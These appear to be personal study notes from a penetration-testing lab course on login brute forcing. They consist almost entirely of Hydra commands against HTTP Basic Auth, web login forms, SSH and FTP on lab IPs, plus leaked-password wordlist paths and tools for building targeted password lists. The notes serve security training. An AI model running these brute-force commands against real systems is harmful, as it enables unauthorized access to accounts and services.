# Login Brute Forcing

# Hydra

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -h` | hydra help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |

# Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` | Common Passwords Wordlist |
| `/opt/useful/SecLists/Usernames/Names/names.txt` | Common Names Wordlist |

# Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `cupp -i` | Creating Custom Password Wordlist |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List |
| `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
| `ftp 127.0.0.1` | FTP to Server |
| `su - user` | Switch to User |


```shell
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

## Username/Password Attack

```shell
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

## Username Brute Force

```shell
hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

hydra -L /usr/share/seclists/Usernames/sap-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -u -f 134.122.105.208 -s 32326 http-get /

hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f 134.122.105.208 -s 32326 http-get /


```


## Brute Forcing Forms

```shell
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
```

To find out how to use the http-post-form module, we can use the "-U" flag to list the parameters it requires and examples of usage:


```shell
hydra http-post-form -U
```

## Login Form Attacks

Let's try to use the ftp-betterdefaultpasslist.txt list with the default credentials to test if one of the accounts is registered in the web application.

```shell
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

### Password Wordlist

```shell
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 134.122.105.208 -s 32326 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```


## CUPP

```shell
f3nr1r@htb[/htb]$ cupp -i
```

```shell
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

## ssh

```shell
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```
```shell
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```


exo: 

```shell
╰─○ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 157.245.37.208 -s 30101 http-get /   


╰─○ hydra -l user -P /usr/share/wordlists/rockyou.txt  -u -f 157.245.37.208 -s 30101 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'" -I

```